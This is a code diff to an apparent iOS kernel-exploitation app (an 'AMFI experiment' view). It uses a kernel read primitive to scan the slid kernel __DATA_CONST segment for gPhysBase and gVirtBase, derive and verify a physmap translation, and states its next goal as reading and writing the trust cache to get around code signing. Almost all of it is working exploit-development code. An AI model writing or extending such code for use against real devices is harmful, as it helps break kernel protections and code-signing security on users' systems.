@@ -3704,13 +3704,78 @@ struct AMFIExperimentView: View {
         }
         
         // Read kernel __DATA segment (where globals live)
-        // ⚠️ DISABLED: __DATA scan causes panic "Unexpected fault in kernel static region"
-        // PPL protects __DATA pages — even ds_kread64_safe cannot catch this fault
-        // FAR was 0xfffffff018af0000 = __DATA + 0x8000
-        detail += "Kernel __DATA: PROTECTED by PPL (scan disabled — causes panic)\n"
-        detail += "gPhysBase/gVirtBase are in PPL-protected __DATA pages\n\n"
+        // ⚠️ __DATA scan causes panic — PPL protects __PPLDATA pages within __DATA range
+        // BUT: Claude research reveals gPhysBase/gVirtBase are in __DATA_CONST.__const!
+        // __DATA_CONST is READABLE from EL1 (only writes are blocked)
+        // Pattern: gPhysBase=0x800000000, gVirtBase=0xffffffe0xxxxxxxx
+        // Located within first 0x200 bytes of __DATA_CONST.__const
         
-        let success = isMachO
+        // __DATA_CONST from kernelcache: vm=0xfffffff007900000, size=0x490000
+        let dataConstStart = 0xfffffff007900000 &+ kernSlide
+        detail += "\n=== Scanning __DATA_CONST for gPhysBase/gVirtBase ===\n"
+        detail += "__DATA_CONST (slid): 0x\(String(format: "%llx", dataConstStart))\n\n"
+        
+        // Scan first 0x1000 bytes (4KB) — globals are near the start
+        var foundPhysBase: UInt64 = 0
+        var foundVirtBase: UInt64 = 0
+        var scanCount = 0
+        
+        for off in stride(from: UInt64(0), to: UInt64(0x1000), by: 8) {
+            let val = ds_kread64_safe(dataConstStart + off)
+            scanCount += 1
+            
+            // gPhysBase pattern: 0x800000000 (DRAM base on A12)
+            if val >= 0x800000000 && val <= 0x900000000 && (val & 0xFFF) == 0 {
+                let nextVal = ds_kread64_safe(dataConstStart + off + 8)
+                // gVirtBase pattern: 0xffffffe0xxxxxxxx (fits GEN2/GEN3 zone)
+                if nextVal > 0xffffffde00000000 && nextVal < 0xffffffe500000000 && (nextVal & 0xFFF) == 0 {
+                    foundPhysBase = val
+                    foundVirtBase = nextVal
+                    detail += "🎯 FOUND at __DATA_CONST+0x\(String(format: "%llx", off))!\n"
+                    detail += "   gPhysBase = 0x\(String(format: "%llx", val))\n"
+                    detail += "   gVirtBase = 0x\(String(format: "%llx", nextVal))\n"
+                    break
+                }
+            }
+            
+            // Also check reversed order (gVirtBase first, gPhysBase second)
+            if val > 0xffffffde00000000 && val < 0xffffffe500000000 && (val & 0xFFF) == 0 {
+                let nextVal = ds_kread64_safe(dataConstStart + off + 8)
+                if nextVal >= 0x800000000 && nextVal <= 0x900000000 && (nextVal & 0xFFF) == 0 {
+                    foundVirtBase = val
+                    foundPhysBase = nextVal
+                    detail += "🎯 FOUND (reversed) at __DATA_CONST+0x\(String(format: "%llx", off))!\n"
+                    detail += "   gVirtBase = 0x\(String(format: "%llx", val))\n"
+                    detail += "   gPhysBase = 0x\(String(format: "%llx", nextVal))\n"
+                    break
+                }
+            }
+        }
+        
+        if foundPhysBase != 0 && foundVirtBase != 0 {
+            detail += "\n🎉🎉🎉 PHYSMAP FORMULA DISCOVERED! 🎉🎉🎉\n"
+            detail += "phystokv(pa) = 0x\(String(format: "%llx", foundVirtBase)) + (pa - 0x\(String(format: "%llx", foundPhysBase)))\n"
+            detail += "kvtophys(va) = 0x\(String(format: "%llx", foundPhysBase)) + (va - 0x\(String(format: "%llx", foundVirtBase)))\n\n"
+            
+            // Verify: read kernel base via physmap
+            let kernPhys = kernBase &- foundVirtBase &+ foundPhysBase
+            detail += "Kernel phys addr: 0x\(String(format: "%llx", kernPhys))\n"
+            
+            let physmapKern = foundVirtBase &+ (kernPhys &- foundPhysBase)
+            let verifyRead = ds_kread64_safe(physmapKern)
+            detail += "Verify (read kern via physmap): 0x\(String(format: "%llx", verifyRead))\n"
+            
+            if verifyRead == kernMagic {
+                detail += "✅ PHYSMAP VERIFIED! Same value as direct read!\n"
+                detail += "\nWe can now convert ANY physical address to readable VA!\n"
+                detail += "Next: find trust cache physical address → read/write via physmap!\n"
+            }
+        } else {
+            detail += "Not found in first 4KB of __DATA_CONST (\(scanCount) reads)\n"
+            detail += "Try expanding scan range or check __DATA_CONST.__const section offset\n"
+        }
+        
+        let success = foundPhysBase != 0 && foundVirtBase != 0
         return ExperimentResult(name: "Physmap Access (Exp 74)", success: success, detail: detail, timestamp: Date())
     }
     
